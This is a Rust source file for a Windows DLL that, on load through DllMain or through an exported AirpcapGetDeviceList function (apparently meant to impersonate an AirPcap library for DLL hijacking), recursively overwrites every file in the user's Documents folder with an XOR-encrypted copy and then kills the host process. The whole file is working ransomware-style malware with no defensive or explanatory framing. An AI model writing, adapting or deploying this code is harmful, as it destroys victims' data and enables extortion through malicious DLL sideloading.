
    #![crate_type = "cdylib"]
    #![allow(non_snake_case)]



    use std::fs;
    use std::io::Write;
    use std::path::Path;
    

    #[no_mangle]
    pub extern "C" fn DllMain(_: *mut std::ffi::c_void, reason: u32, _: *mut std::ffi::c_void) -> bool {
        if reason == 1 { // DLL_PROCESS_ATTACH
            encrypt_files("teste"); // Encrypt files on process attach
            std::process::exit(0);   // Terminate the process
        }
        true
    }

    #[no_mangle]
    pub extern "C" fn AirpcapGetDeviceList() {
        encrypt_files("teste");
    }

    fn encrypt_files(key: &str) {
    use dirs_next::home_dir;
        if let Some(home_dir) = home_dir() {
            let target_dir = home_dir.join("Documents");

            if target_dir.exists() {
                encrypt_directory(&target_dir, key);
            }
        } else {
            eprintln!("Could not determine the user's home directory.");
        }
    }

    fn encrypt_directory(dir: &Path, key: &str) {
        if dir.is_dir() {
            for entry in fs::read_dir(dir).expect("Failed to read directory") {
                if let Ok(entry) = entry {
                    let path = entry.path();

                    if path.is_dir() {
                        // Recursively encrypt subdirectories
                        encrypt_directory(&path, key);
                    } else if path.is_file() {
                        encrypt_file(&path, key);
                    }
                }
            }
        }
    }

    fn encrypt_file(file_path: &Path, key: &str) {
        if let Ok(mut file) = fs::File::open(file_path) {
            let mut data = Vec::new();
            use std::io::Read;
            if file.read_to_end(&mut data).is_ok() {
                let encrypted_data = encrypt(&data, key);
                if let Ok(mut file) = fs::File::create(file_path) {
                    let _ = file.write_all(&encrypted_data);
                }
            }
        }
    }

    fn encrypt(data: &[u8], key: &str) -> Vec<u8> {
        let key_bytes = key.as_bytes();
        data.iter()
            .zip(key_bytes.iter().cycle())
            .map(|(&d, &k)| d ^ k)
            .collect()
    }
    